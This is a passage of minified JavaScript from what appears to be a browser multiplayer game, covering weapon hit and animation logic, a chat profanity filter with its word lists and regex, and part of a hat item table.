          var y7 = O.weapons[this.weaponIndex].gather + (3 == B.type ? 4 : 0);
          this.skin && this.skin.extraGold && this.addResource(3, 1), this.addResource(B.type, y7);
        }
        j = !0, F.hitObj(B, W);
      }
      for (y5 = 0; y5 < Z.length + z.length; ++y5) if ((B = Z[y5] || z[y5 - Z.length]) != this && B.alive && (!B.team || B.team != this.team) && N.getDistance(this.x, this.y, B.x, B.y) - 1.8 * B.scale <= O.weapons[this.weaponIndex].range && (W = N.getDirection(B.x, B.y, this.x, this.y), N.getAngleDist(W, this.dir) <= H.gatherAngle)) {
        var y8 = O.weapons[this.weaponIndex].steal;
        y8 && B.addResource && (y8 = Math.min(B.points || 0, y8), this.addResource(3, y8), B.addResource(3, -y8));
        var y9 = y1;
        null != B.weaponIndex && O.weapons[B.weaponIndex].shield && N.getAngleDist(W + Math.PI, B.dir) <= H.shieldAngle && (y9 = O.weapons[B.weaponIndex].shield);
        var yy = O.weapons[this.weaponIndex].dmg * (this.skin && this.skin.dmgMultO ? this.skin.dmgMultO : 1) * (this.tail && this.tail.dmgMultO ? this.tail.dmgMultO : 1), yV = 0.3 * (B.weightM || 1) + (O.weapons[this.weaponIndex].knock || 0);
        B.xVel += yV * L(W), B.yVel += yV * p(W), this.skin && this.skin.healD && this.changeHealth(yy * y9 * this.skin.healD, this), this.tail && this.tail.healD && this.changeHealth(yy * y9 * this.tail.healD, this), B.skin && B.skin.dmg && 1 == y9 && this.changeHealth(-yy * B.skin.dmg, B), B.tail && B.tail.dmg && 1 == y9 && this.changeHealth(-yy * B.tail.dmg, B), !(B.dmgOverTime && this.skin && this.skin.poisonDmg) || B.skin && B.skin.poisonRes || (B.dmgOverTime.dmg = this.skin.poisonDmg, B.dmgOverTime.time = this.skin.poisonTime || 1, B.dmgOverTime.doer = this), !B.dmgOverTime || !y0 || B.skin && B.skin.poisonRes || (B.dmgOverTime.dmg = 5, B.dmgOverTime.time = 5, B.dmgOverTime.doer = this), B.skin && B.skin.dmgK && (this.xVel -= B.skin.dmgK * L(W), this.yVel -= B.skin.dmgK * p(W)), B.changeHealth(-yy * y9, this, this);
      }
      this.sendAnimation(j ? 1 : 0);
    }, this.sendAnimation = function (W) {
      for (var B = 0; B < Z.length; ++B) this.sentTo[Z[B].id] && this.canSee(Z[B]) && M.send(Z[B].id, "7", this.sid, W ? 1 : 0, this.weaponIndex);
    };
    var Q = 0, D = 0;
    this.animate = function (W) {
      this.animTime > 0 && (this.animTime -= W, this.animTime <= 0 ? (this.animTime = 0, this.dirPlus = 0, Q = 0, D = 0) : 0 == D ? (Q += W / (this.animSpeed * H.hitReturnRatio), this.dirPlus = N.lerp(0, this.targetAngle, Math.min(1, Q)), Q >= 1 && (Q = 1, D = 1)) : (Q -= W / (this.animSpeed * (1 - H.hitReturnRatio)), this.dirPlus = N.lerp(0, this.targetAngle, Math.max(0, Q))));
    }, this.startAnim = function (W, B) {
      this.animTime = this.animSpeed = O.weapons[B].speed, this.targetAngle = W ? -H.hitAngle : -Math.PI, Q = 0, D = 0;
      if (B > 9) {
        setTimeout(() => {
          this.secondary.reload = 0;
          if (this.skinIndex == 20) {
            this.secondary.fastReload = !![];
          }
        });
      } else {
        setTimeout(() => {
          this.primary.reload = 0;
          if (this.skinIndex == 20) {
            this.primary.fastReload = ![];
          }
        });
      }
    }, this.canSee = function (W) {
      if (!W) return !1;
      if (W.skin && W.skin.invisTimer && W.noMovTimer >= W.skin.invisTimer) return !1;
      var B = T(W.x - this.x) - W.scale, j = T(W.y - this.y) - W.scale;
      return B <= H.maxScreenWidth / 2 * 1.3 && j <= H.maxScreenHeight / 2 * 1.3;
    };
  };
}, function (y, V, d) {
  const J = d(50).words, T = d(51).array;
  y.exports = class {
    constructor(c = {}) {
      Object.assign(this, {list: c.emptyList && [] || Array.prototype.concat.apply(J, [T, c.list || []]), exclude: c.exclude || [], placeHolder: c.placeHolder || "*", regex: c.regex || /[^a-zA-Z0-9|\$|\@]|\^/g, replaceRegex: c.replaceRegex || /\w/g});
    }
    ["isProfane"](c) {
      return this.list.filter(L => {
        const s = new RegExp("\\b" + L.replace(/(\W)/g, "\\$1") + "\\b", "gi");
        return !this.exclude.includes(L.toLowerCase()) && s.test(c);
      }).length > 0 || !1;
    }
    ["replaceWord"](c) {
      return c.replace(this.regex, "").replace(this.replaceRegex, this.placeHolder);
    }
    ["clean"](c) {
      return c.split(/\b/).map(L => this.isProfane(L) ? this.replaceWord(L) : L).join("");
    }
    ["addWords"]() {
      let c = Array.from(arguments);
      this.list.push(...c), c.map(L => L.toLowerCase()).forEach(L => {
        this.exclude.includes(L) && this.exclude.splice(this.exclude.indexOf(L), 1);
      });
    }
    ["removeWords"]() {
      this.exclude.push(...Array.from(arguments).map(c => c.toLowerCase()));
    }
  };
}, function (y) {
  y.exports = {words: ["ahole", "anus", "ash0le", "ash0les", "asholes", "ass", "Ass Monkey", "Assface", "assh0le", "assh0lez", "asshole", "assholes", "assholz", "asswipe", "azzhole", "bassterds", "bastard", "bastards", "bastardz", "basterds", "basterdz", "Biatch", "bitch", "bitches", "Blow Job", "boffing", "butthole", "buttwipe", "c0ck", "c0cks", "c0k", "Carpet Muncher", "cawk", "cawks", "Clit", "cnts", "cntz", "cock", "cockhead", "cock-head", "cocks", "CockSucker", "cock-sucker", "crap", "cum", "cunt", "cunts", "cuntz", "dick", "dild0", "dild0s", "dildo", "dildos", "dilld0", "dilld0s", "dominatricks", "dominatrics", "dominatrix", "dyke", "enema", "f u c k", "f u c k e r", "fag", "fag1t", "faget", "fagg1t", "faggit", "faggot", "fagg0t", "fagit", "fags", "fagz", "faig", "faigs", "fart", "flipping the bird", "fuck", "fucker", "fuckin", "fucking", "fucks", "Fudge Packer", "fuk", "Fukah", "Fuken", "fuker", "Fukin", "Fukk", "Fukkah", "Fukken", "Fukker", "Fukkin", "g00k", "God-damned", "h00r", "h0ar", "h0re", "hells", "hoar", "hoor", "hoore", "jackoff", "jap", "japs", "jerk-off", "jisim", "jiss", "jizm", "jizz", "knob", "knobs", "knobz", "kunt", "kunts", "kuntz", "Lezzian", "Lipshits", "Lipshitz", "masochist", "masokist", "massterbait", "masstrbait", "masstrbate", "masterbaiter", "masterbate", "masterbates", "Motha Fucker", "Motha Fuker", "Motha Fukkah", "Motha Fukker", "Mother Fucker", "Mother Fukah", "Mother Fuker", "Mother Fukkah", "Mother Fukker", "mother-fucker", "Mutha Fucker", "Mutha Fukah", "Mutha Fuker", "Mutha Fukkah", "Mutha Fukker", "n1gr", "nastt", "nigger;", "nigur;", "niiger;", "niigr;", "orafis", "orgasim;", "orgasm", "orgasum", "oriface", "orifice", "orifiss", "packi", "packie", "packy", "paki", "pakie", "paky", "pecker", "peeenus", "peeenusss", "peenus", "peinus", "pen1s", "penas", "penis", "penis-breath", "penus", "penuus", "Phuc", "Phuck", "Phuk", "Phuker", "Phukker", "polac", "polack", "polak", "Poonani", "pr1c", "pr1ck", "pr1k", "pusse", "pussee", "pussy", "puuke", "puuker", "queer", "queers", "queerz", "qweers", "qweerz", "qweir", "recktum", "rectum", "potDmg", "sadist", "scank", "schlong", "screwing", "semen", "sex", "sexy", "Sh!t", "sh1t", "sh1ter", "sh1ts", "sh1tter", "sh1tz", "shit", "shits", "shitter", "Shitty", "Shity", "shitz", "Shyt", "Shyte", "Shytty", "Shyty", "skanck", "skank", "skankee", "skankey", "skanks", "Skanky", "slag", "slut", "sluts", "Slutty", "slutz", "son-of-a-bitch", "tit", "turd", "va1jina", "vag1na", "vagiina", "vagina", "vaj1na", "vajina", "vullva", "vulva", "w0p", "wh00r", "wh0re", "whore", "xrated", "xxx", "b!+ch", "bitch", "blowjob", "clit", "arschloch", "fuck", "shit", "ass", "asshole", "b!tch", "b17ch", "b1tch", "bastard", "bi+ch", "boiolas", "buceta", "c0ck", "cawk", "chink", "cipa", "clits", "cock", "cum", "cunt", "dildo", "dirsa", "ejakulate", "fatass", "fcuk", "fuk", "fux0r", "hoer", "hore", "jism", "kawk", "l3itch", "l3i+ch", "lesbian", "masturbate", "masterbat*", "masterbat3", "motherfucker", "s.o.b.", "mofo", "nazi", "nigga", "nigger", "nutsack", "phuck", "pimpis", "pusse", "pussy", "scrotum", "sh!t", "shemale", "shi+", "sh!+", "slut", "smut", "teets", "tits", "boobs", "b00bs", "teez", "testical", "testicle", "titt", "w00se", "jackoff", "wank", "whoar", "whore", "*damn", "*dyke", "*fuck*", "*shit*", "@$$", "amcik", "andskota", "arse*", "assrammer", "ayir", "bi7ch", "bitch*", "bollock*", "breasts", "butt-pirate", "cabron", "cazzo", "chraa", "chuj", "Cock*", "cunt*", "d4mn", "daygo", "dego", "dick*", "dike*", "dupa", "dziwka", "ejackulate", "Ekrem*", "Ekto", "enculer", "faen", "fag*", "fanculo", "fanny", "feces", "feg", "Felcher", "ficken", "fitt*", "Flikker", "foreskin", "Fotze", "Fu(*", "fuk*", "futkretzn", "gook", "guiena", "h0r", "h4x0r", "hell", "helvete", "hoer*", "honkey", "Huevon", "hui", "injun", "jizz", "kanker*", "kike", "klootzak", "kraut", "knulle", "kuk", "kuksuger", "Kurac", "kurwa", "kusi*", "kyrpa*", "lesbo", "mamhoon", "masturbat*", "merd*", "mibun", "monkleigh", "mouliewop", "muie", "mulkku", "muschi", "nazis", "nepesaurio", "nigger*", "orospu", "paska*", "perse", "picka", "pierdol*", "pillu*", "pimmel", "piss*", "pizda", "poontsee", "poop", "porn", "p0rn", "pr0n", "preteen", "pula", "pule", "puta", "puto", "qahbeh", "queef*", "rautenberg", "schaffer", "scheiss*", "schlampe", "schmuck", "screw", "sh!t*", "sharmuta", "sharmute", "shipal", "shiz", "skribz", "skurwysyn", "sphencter", "spic", "spierdalaj", "splooge", "suka", "b00b*", "testicle*", "titt*", "twat", "vittu", "wank*", "wetback*", "wichser", "wop*", "yed", "zabourah"]};
}, function (y, V, d) {
  y.exports = {object: d(52), array: d(53), regex: d(54)};
}, function (y, V) {
  y.exports = {"4r5e": 1, "5h1t": 1, "5hit": 1, a55: 1, anal: 1, anus: 1, ar5e: 1, arrse: 1, arse: 1, ass: 1, "ass-fucker": 1, asses: 1, assfucker: 1, assfukka: 1, asshole: 1, assholes: 1, asswhole: 1, a_s_s: 1, "b!tch": 1, b00bs: 1, b17ch: 1, b1tch: 1, ballbag: 1, balls: 1, ballsack: 1, bastard: 1, beastial: 1, beastiality: 1, bellend: 1, bestial: 1, bestiality: 1, "bi+ch": 1, biatch: 1, bitch: 1, bitcher: 1, bitchers: 1, bitches: 1, bitchin: 1, bitching: 1, bloody: 1, "blow job": 1, blowjob: 1, blowjobs: 1, boiolas: 1, bollock: 1, bollok: 1, boner: 1, boob: 1, boobs: 1, booobs: 1, boooobs: 1, booooobs: 1, booooooobs: 1, breasts: 1, buceta: 1, bugger: 1, bum: 1, "bunny fucker": 1, butt: 1, butthole: 1, buttmuch: 1, buttplug: 1, c0ck: 1, c0cksucker: 1, "carpet muncher": 1, cawk: 1, chink: 1, cipa: 1, cl1t: 1, clit: 1, clitoris: 1, clits: 1, cnut: 1, cock: 1, "cock-sucker": 1, cockface: 1, cockhead: 1, cockmunch: 1, cockmuncher: 1, cocks: 1, cocksuck: 1, cocksucked: 1, cocksucker: 1, cocksucking: 1, cocksucks: 1, cocksuka: 1, cocksukka: 1, cok: 1, cokmuncher: 1, coksucka: 1, coon: 1, cox: 1, crap: 1, cum: 1, cummer: 1, cumming: 1, cums: 1, cumshot: 1, cunilingus: 1, cunillingus: 1, cunnilingus: 1, cunt: 1, cuntlick: 1, cuntlicker: 1, cuntlicking: 1, cunts: 1, cyalis: 1, cyberfuc: 1, cyberfuck: 1, cyberfucked: 1, cyberfucker: 1, cyberfuckers: 1, cyberfucking: 1, d1ck: 1, damn: 1, dick: 1, dickhead: 1, dildo: 1, dildos: 1, dink: 1, dinks: 1, dirsa: 1, dlck: 1, "dog-fucker": 1, doggin: 1, dogging: 1, donkeyribber: 1, doosh: 1, duche: 1, dyke: 1, ejaculate: 1, ejaculated: 1, ejaculates: 1, ejaculating: 1, ejaculatings: 1, ejaculation: 1, ejakulate: 1, "f u c k": 1, "f u c k e r": 1, f4nny: 1, fag: 1, fagging: 1, faggitt: 1, faggot: 1, faggs: 1, fagot: 1, fagots: 1, fags: 1, fanny: 1, fannyflaps: 1, fannyfucker: 1, fanyy: 1, fatass: 1, fcuk: 1, fcuker: 1, fcuking: 1, feck: 1, fecker: 1, felching: 1, fellate: 1, fellatio: 1, fingerfuck: 1, fingerfucked: 1, fingerfucker: 1, fingerfuckers: 1, fingerfucking: 1, fingerfucks: 1, fistfuck: 1, fistfucked: 1, fistfucker: 1, fistfuckers: 1, fistfucking: 1, fistfuckings: 1, fistfucks: 1, flange: 1, fook: 1, fooker: 1, fuck: 1, fucka: 1, fucked: 1, fucker: 1, fuckers: 1, fuckhead: 1, fuckheads: 1, fuckin: 1, fucking: 1, fuckings: 1, fuckingshitmotherfucker: 1, fuckme: 1, fucks: 1, fuckwhit: 1, fuckwit: 1, "fudge packer": 1, fudgepacker: 1, fuk: 1, fuker: 1, fukker: 1, fukkin: 1, fuks: 1, fukwhit: 1, fukwit: 1, fux: 1, fux0r: 1, f_u_c_k: 1, gangbang: 1, gangbanged: 1, gangbangs: 1, gaylord: 1, gaysex: 1, goatse: 1, God: 1, "god-dam": 1, "god-damned": 1, goddamn: 1, goddamned: 1, hardcoresex: 1, hell: 1, heshe: 1, hoar: 1, hoare: 1, hoer: 1, homo: 1, hore: 1, horniest: 1, horny: 1, hotsex: 1, "jack-off": 1, jackoff: 1, jap: 1, "jerk-off": 1, jism: 1, jiz: 1, jizm: 1, jizz: 1, kawk: 1, knob: 1, knobead: 1, knobed: 1, knobend: 1, knobhead: 1, knobjocky: 1, knobjokey: 1, kock: 1, kondum: 1, kondums: 1, kum: 1, kummer: 1, kumming: 1, kums: 1, kunilingus: 1, "l3i+ch": 1, l3itch: 1, labia: 1, lust: 1, lusting: 1, m0f0: 1, m0fo: 1, m45terbate: 1, ma5terb8: 1, ma5terbate: 1, masochist: 1, "master-bate": 1, masterb8: 1, "masterbat*": 1, masterbat3: 1, masterbate: 1, masterbation: 1, masterbations: 1, masturbate: 1, "mo-fo": 1, mof0: 1, mofo: 1, mothafuck: 1, mothafucka: 1, mothafuckas: 1, mothafuckaz: 1, mothafucked: 1, mothafucker: 1, mothafuckers: 1, mothafuckin: 1, mothafucking: 1, mothafuckings: 1, mothafucks: 1, "mother fucker": 1, motherfuck: 1, motherfucked: 1, motherfucker: 1, motherfuckers: 1, motherfuckin: 1, motherfucking: 1, motherfuckings: 1, motherfuckka: 1, motherfucks: 1, muff: 1, mutha: 1, muthafecker: 1, muthafuckker: 1, muther: 1, mutherfucker: 1, n1gga: 1, n1gger: 1, nazi: 1, nigg3r: 1, nigg4h: 1, nigga: 1, niggah: 1, niggas: 1, niggaz: 1, nigger: 1, niggers: 1, nob: 1, "nob jokey": 1, nobhead: 1, nobjocky: 1, nobjokey: 1, numbnuts: 1, nutsack: 1, orgasim: 1, orgasims: 1, orgasm: 1, orgasms: 1, p0rn: 1, pawn: 1, pecker: 1, penis: 1, penisfucker: 1, phonesex: 1, phuck: 1, phuk: 1, phuked: 1, phuking: 1, phukked: 1, phukking: 1, phuks: 1, phuq: 1, pigfucker: 1, pimpis: 1, piss: 1, pissed: 1, pisser: 1, pissers: 1, pisses: 1, pissflaps: 1, pissin: 1, pissing: 1, pissoff: 1, poop: 1, porn: 1, porno: 1, pornography: 1, pornos: 1, prick: 1, pricks: 1, pron: 1, pube: 1, pusse: 1, pussi: 1, pussies: 1, pussy: 1, pussys: 1, rectum: 1, potDmg: 1, rimjaw: 1, rimming: 1, "s hit": 1, "s.o.b.": 1, sadist: 1, schlong: 1, screwing: 1, scroat: 1, scrote: 1, scrotum: 1, semen: 1, sex: 1, "sh!+": 1, "sh!t": 1, sh1t: 1, shag: 1, shagger: 1, shaggin: 1, shagging: 1, shemale: 1, "shi+": 1, shit: 1, shitdick: 1, shite: 1, shited: 1, shitey: 1, shitfuck: 1, shitfull: 1, shithead: 1, shiting: 1, shitings: 1, shits: 1, shitted: 1, shitter: 1, shitters: 1, shitting: 1, shittings: 1, shitty: 1, skank: 1, slut: 1, sluts: 1, smegma: 1, smut: 1, snatch: 1, "son-of-a-bitch": 1, spac: 1, spunk: 1, s_h_i_t: 1, t1tt1e5: 1, t1tties: 1, teets: 1, teez: 1, testical: 1, testicle: 1, tit: 1, titfuck: 1, tits: 1, titt: 1, tittie5: 1, tittiefucker: 1, titties: 1, tittyfuck: 1, tittywank: 1, titwank: 1, tosser: 1, turd: 1, tw4t: 1, twat: 1, twathead: 1, twatty: 1, twunt: 1, twunter: 1, v14gra: 1, v1gra: 1, vagina: 1, viagra: 1, vulva: 1, w00se: 1, wang: 1, wank: 1, wanker: 1, wanky: 1, whoar: 1, whore: 1, willies: 1, willy: 1, xrated: 1, xxx: 1};
}, function (y, V) {
  y.exports = ["4r5e", "5h1t", "5hit", "a55", "anal", "anus", "ar5e", "arrse", "arse", "ass", "ass-fucker", "asses", "assfucker", "assfukka", "asshole", "assholes", "asswhole", "a_s_s", "b!tch", "b00bs", "b17ch", "b1tch", "ballbag", "balls", "ballsack", "bastard", "beastial", "beastiality", "bellend", "bestial", "bestiality", "bi+ch", "biatch", "bitch", "bitcher", "bitchers", "bitches", "bitchin", "bitching", "bloody", "blow job", "blowjob", "blowjobs", "boiolas", "bollock", "bollok", "boner", "boob", "boobs", "booobs", "boooobs", "booooobs", "booooooobs", "breasts", "buceta", "bugger", "bum", "bunny fucker", "butt", "butthole", "buttmuch", "buttplug", "c0ck", "c0cksucker", "carpet muncher", "cawk", "chink", "cipa", "cl1t", "clit", "clitoris", "clits", "cnut", "cock", "cock-sucker", "cockface", "cockhead", "cockmunch", "cockmuncher", "cocks", "cocksuck", "cocksucked", "cocksucker", "cocksucking", "cocksucks", "cocksuka", "cocksukka", "cok", "cokmuncher", "coksucka", "coon", "cox", "crap", "cum", "cummer", "cumming", "cums", "cumshot", "cunilingus", "cunillingus", "cunnilingus", "cunt", "cuntlick", "cuntlicker", "cuntlicking", "cunts", "cyalis", "cyberfuc", "cyberfuck", "cyberfucked", "cyberfucker", "cyberfuckers", "cyberfucking", "d1ck", "damn", "dick", "dickhead", "dildo", "dildos", "dink", "dinks", "dirsa", "dlck", "dog-fucker", "doggin", "dogging", "donkeyribber", "doosh", "duche", "dyke", "ejaculate", "ejaculated", "ejaculates", "ejaculating", "ejaculatings", "ejaculation", "ejakulate", "f u c k", "f u c k e r", "f4nny", "fag", "fagging", "faggitt", "faggot", "faggs", "fagot", "fagots", "fags", "fanny", "fannyflaps", "fannyfucker", "fanyy", "fatass", "fcuk", "fcuker", "fcuking", "feck", "fecker", "felching", "fellate", "fellatio", "fingerfuck", "fingerfucked", "fingerfucker", "fingerfuckers", "fingerfucking", "fingerfucks", "fistfuck", "fistfucked", "fistfucker", "fistfuckers", "fistfucking", "fistfuckings", "fistfucks", "flange", "fook", "fooker", "fuck", "fucka", "fucked", "fucker", "fuckers", "fuckhead", "fuckheads", "fuckin", "fucking", "fuckings", "fuckingshitmotherfucker", "fuckme", "fucks", "fuckwhit", "fuckwit", "fudge packer", "fudgepacker", "fuk", "fuker", "fukker", "fukkin", "fuks", "fukwhit", "fukwit", "fux", "fux0r", "f_u_c_k", "gangbang", "gangbanged", "gangbangs", "gaylord", "gaysex", "goatse", "God", "god-dam", "god-damned", "goddamn", "goddamned", "hardcoresex", "hell", "heshe", "hoar", "hoare", "hoer", "homo", "hore", "horniest", "horny", "hotsex", "jack-off", "jackoff", "jap", "jerk-off", "jism", "jiz", "jizm", "jizz", "kawk", "knob", "knobead", "knobed", "knobend", "knobhead", "knobjocky", "knobjokey", "kock", "kondum", "kondums", "kum", "kummer", "kumming", "kums", "kunilingus", "l3i+ch", "l3itch", "labia", "lust", "lusting", "m0f0", "m0fo", "m45terbate", "ma5terb8", "ma5terbate", "masochist", "master-bate", "masterb8", "masterbat*", "masterbat3", "masterbate", "masterbation", "masterbations", "masturbate", "mo-fo", "mof0", "mofo", "mothafuck", "mothafucka", "mothafuckas", "mothafuckaz", "mothafucked", "mothafucker", "mothafuckers", "mothafuckin", "mothafucking", "mothafuckings", "mothafucks", "mother fucker", "motherfuck", "motherfucked", "motherfucker", "motherfuckers", "motherfuckin", "motherfucking", "motherfuckings", "motherfuckka", "motherfucks", "muff", "mutha", "muthafecker", "muthafuckker", "muther", "mutherfucker", "n1gga", "n1gger", "nazi", "nigg3r", "nigg4h", "nigga", "niggah", "niggas", "niggaz", "nigger", "niggers", "nob", "nob jokey", "nobhead", "nobjocky", "nobjokey", "numbnuts", "nutsack", "orgasim", "orgasims", "orgasm", "orgasms", "p0rn", "pawn", "pecker", "penis", "penisfucker", "phonesex", "phuck", "phuk", "phuked", "phuking", "phukked", "phukking", "phuks", "phuq", "pigfucker", "pimpis", "piss", "pissed", "pisser", "pissers", "pisses", "pissflaps", "pissin", "pissing", "pissoff", "poop", "porn", "porno", "pornography", "pornos", "prick", "pricks", "pron", "pube", "pusse", "pussi", "pussies", "pussy", "pussys", "rectum", "potDmg", "rimjaw", "rimming", "s hit", "s.o.b.", "sadist", "schlong", "screwing", "scroat", "scrote", "scrotum", "semen", "sex", "sh!+", "sh!t", "sh1t", "shag", "shagger", "shaggin", "shagging", "shemale", "shi+", "shit", "shitdick", "shite", "shited", "shitey", "shitfuck", "shitfull", "shithead", "shiting", "shitings", "shits", "shitted", "shitter", "shitters", "shitting", "shittings", "shitty", "skank", "slut", "sluts", "smegma", "smut", "snatch", "son-of-a-bitch", "spac", "spunk", "s_h_i_t", "t1tt1e5", "t1tties", "teets", "teez", "testical", "testicle", "tit", "titfuck", "tits", "titt", "tittie5", "tittiefucker", "titties", "tittyfuck", "tittywank", "titwank", "tosser", "turd", "tw4t", "twat", "twathead", "twatty", "twunt", "twunter", "v14gra", "v1gra", "vagina", "viagra", "vulva", "w00se", "wang", "wank", "wanker", "wanky", "whoar", "whore", "willies", "willy", "xrated", "xxx"];
}, function (y, V) {
  y.exports = /\b(4r5e|5h1t|5hit|a55|anal|anus|ar5e|arrse|arse|ass|ass-fucker|asses|assfucker|assfukka|asshole|assholes|asswhole|a_s_s|b!tch|b00bs|b17ch|b1tch|ballbag|balls|ballsack|bastard|beastial|beastiality|bellend|bestial|bestiality|bi\+ch|biatch|bitch|bitcher|bitchers|bitches|bitchin|bitching|bloody|blow job|blowjob|blowjobs|boiolas|bollock|bollok|boner|boob|boobs|booobs|boooobs|booooobs|booooooobs|breasts|buceta|bugger|bum|bunny fucker|butt|butthole|buttmuch|buttplug|c0ck|c0cksucker|carpet muncher|cawk|chink|cipa|cl1t|clit|clitoris|clits|cnut|cock|cock-sucker|cockface|cockhead|cockmunch|cockmuncher|cocks|cocksuck|cocksucked|cocksucker|cocksucking|cocksucks|cocksuka|cocksukka|cok|cokmuncher|coksucka|coon|cox|crap|cum|cummer|cumming|cums|cumshot|cunilingus|cunillingus|cunnilingus|cunt|cuntlick|cuntlicker|cuntlicking|cunts|cyalis|cyberfuc|cyberfuck|cyberfucked|cyberfucker|cyberfuckers|cyberfucking|d1ck|damn|dick|dickhead|dildo|dildos|dink|dinks|dirsa|dlck|dog-fucker|doggin|dogging|donkeyribber|doosh|duche|dyke|ejaculate|ejaculated|ejaculates|ejaculating|ejaculatings|ejaculation|ejakulate|f u c k|f u c k e r|f4nny|fag|fagging|faggitt|faggot|faggs|fagot|fagots|fags|fanny|fannyflaps|fannyfucker|fanyy|fatass|fcuk|fcuker|fcuking|feck|fecker|felching|fellate|fellatio|fingerfuck|fingerfucked|fingerfucker|fingerfuckers|fingerfucking|fingerfucks|fistfuck|fistfucked|fistfucker|fistfuckers|fistfucking|fistfuckings|fistfucks|flange|fook|fooker|fuck|fucka|fucked|fucker|fuckers|fuckhead|fuckheads|fuckin|fucking|fuckings|fuckingshitmotherfucker|fuckme|fucks|fuckwhit|fuckwit|fudge packer|fudgepacker|fuk|fuker|fukker|fukkin|fuks|fukwhit|fukwit|fux|fux0r|f_u_c_k|gangbang|gangbanged|gangbangs|gaylord|gaysex|goatse|God|god-dam|god-damned|goddamn|goddamned|hardcoresex|hell|heshe|hoar|hoare|hoer|homo|hore|horniest|horny|hotsex|jack-off|jackoff|jap|jerk-off|jism|jiz|jizm|jizz|kawk|knob|knobead|knobed|knobend|knobhead|knobjocky|knobjokey|kock|kondum|kondums|kum|kummer|kumming|kums|kunilingus|l3i\+ch|l3itch|labia|lust|lusting|m0f0|m0fo|m45terbate|ma5terb8|ma5terbate|masochist|master-bate|masterb8|masterbat*|masterbat3|masterbate|masterbation|masterbations|masturbate|mo-fo|mof0|mofo|mothafuck|mothafucka|mothafuckas|mothafuckaz|mothafucked|mothafucker|mothafuckers|mothafuckin|mothafucking|mothafuckings|mothafucks|mother fucker|motherfuck|motherfucked|motherfucker|motherfuckers|motherfuckin|motherfucking|motherfuckings|motherfuckka|motherfucks|muff|mutha|muthafecker|muthafuckker|muther|mutherfucker|n1gga|n1gger|nazi|nigg3r|nigg4h|nigga|niggah|niggas|niggaz|nigger|niggers|nob|nob jokey|nobhead|nobjocky|nobjokey|numbnuts|nutsack|orgasim|orgasims|orgasm|orgasms|p0rn|pawn|pecker|penis|penisfucker|phonesex|phuck|phuk|phuked|phuking|phukked|phukking|phuks|phuq|pigfucker|pimpis|piss|pissed|pisser|pissers|pisses|pissflaps|pissin|pissing|pissoff|poop|porn|porno|pornography|pornos|prick|pricks|pron|pube|pusse|pussi|pussies|pussy|pussys|rectum|potDmg|rimjaw|rimming|s hit|s.o.b.|sadist|schlong|screwing|scroat|scrote|scrotum|semen|sex|sh!\+|sh!t|sh1t|shag|shagger|shaggin|shagging|shemale|shi\+|shit|shitdick|shite|shited|shitey|shitfuck|shitfull|shithead|shiting|shitings|shits|shitted|shitter|shitters|shitting|shittings|shitty|skank|slut|sluts|smegma|smut|snatch|son-of-a-bitch|spac|spunk|s_h_i_t|t1tt1e5|t1tties|teets|teez|testical|testicle|tit|titfuck|tits|titt|tittie5|tittiefucker|titties|tittyfuck|tittywank|titwank|tosser|turd|tw4t|twat|twathead|twatty|twunt|twunter|v14gra|v1gra|vagina|viagra|vulva|w00se|wang|wank|wanker|wanky|whoar|whore|willies|willy|xrated|xxx)\b/gi;
}, function (y, V) {
  y.exports.hats = [{id: 45, name: "Shame!", price: 0, scale: 120, desc: "hacks are for losers"}, {id: 51, name: "Moo Cap", price: 0, scale: 120, desc: "coolest mooer around"}, {id: 50, name: "Apple Cap", price: 0, scale: 120, desc: "apple farms remembers"}, {id: 28, name: "Moo Head", price: 0, scale: 120, desc: "no effect"}, {id: 29, name: "Pig Head", price: 0, scale: 120, desc: "no effect"}, {id: 30, name: "Fluff Head", price: 0, scale: 120, desc: "no effect"}, {id: 36, name: "Pandou Head", price: 0, scale: 120, desc: "no effect"}, {id: 37, name: "Bear Head", price: 0, scale: 120, desc: "no effect"}, {id: 38, name: "Monkey Head", price: 0, scale: 120, desc: "no effect"}, {id: 44, name: "Polar Head", price: 0, scale: 120, desc: "no effect"}, {id: 35, name: "Fez Hat", price: 0, scale: 120, desc: "no effect"}, {id: 42, name: "Enigma Hat", price: 0, scale: 120, desc: "join the enigma army"}, {id: 43, name: "Blitz Hat", price: 0, scale: 120, desc: "hey everybody i'm blitz"}, {id: 49, name: "Bob XIII Hat", price: 0, scale: 120, desc: "like and subscribe"}, {id: 57, name: "Pumpkin", price: 50, scale: 120, desc: "Spooooky"}, {id: 8, name: "Bummle Hat", price: 100, scale: 120, desc: "no effect"}, {id: 2, name: "Straw Hat", price: 500, scale: 120, desc: "no effect"}, {id: 15, name: "Winter Cap", price: 600, scale: 120, desc: "allows you to move at normal speed in snow", coldM: 1}, {id: 5, name: "Cowboy Hat", price: 1e3, scale: 120, desc: "no effect"}, {id: 4, name: "Ranger Hat", price: 2e3, scale: 120, desc: "no effect"}, {id: 18, name: "Explorer Hat", price: 2e3, scale: 120, desc: "no effect"}, {id: 31, name: "Flipper Hat", price: 2500, scale: 120, desc: "have more control while in water", watrImm: !0}, {id: 1, name: "Marksman Cap", price: 3e3, scale: 120, desc: "increases arrow speed and range", aMlt: 1.3}, {id: 10, name: "Bush Gear", price: 3e3, scale: 160, desc: "allows you to disguise yourself as a bush"}, {id: 48, name: "Halo", price: 3e3, scale: 120, desc: "no effect"}, {id: 6, name: "Soldier Helmet", price: 4e3, scale: 120, desc: "reduces damage taken but slows movement", spdMult: 0.94, dmgMult: 0.75}, {id: 23, name: "Anti Venom Gear", price: 4e3, scale: 120, desc: "makes you immune to poison", poisonRes: 1}, {id: 13, name: "Medic Gear", price: 5e3, scale: 110, desc: "slowly regenerates health over time", healthRegen: 3}, {id: 9, name: "Miners Helmet", price: 5e3, scale: 120, desc: "earn 1 extra gold per resource", extraGold: 1}, {id: 32, name: "Musketeer Hat", price: 5e3, scale: 120, desc: "reduces cost of projectiles", projCost: 0.5}, {id: 7, name: "Bull Helmet", price: 6e3, scale: 120, desc: "increases damage done but drains health", healthRegen: -5, dmgMultO: 1.5, spdMult: 0.96}, {id: 22, name: "Emp Helmet", price: 6e3, scale: 120, desc: "Turrets won't attack but you move slower", antiTurret: 1, spdMult: 0.7}, {id: 12, name: "Booster Hat", price: 6e3, scale: 120, desc: "increases your movement speed", spdMult: 1.16}, {id: 26, name: "Barbarian Armor", price: 8e3, scale: 120, desc: "knocks back enemies that attack you", dmgK: 0.6}, {id: 21, name: "Plague Mask", price: 1e4, scale: 120, desc: "melee heals deal poison damage", poisonDmg: 5, poisonTime: 6}, {id: 46, name: "Bull Mask", price: 1e4, scale: 120, desc: "bulls won't target you unless you attack them", bullRepel: 1}, {id: 14, name: 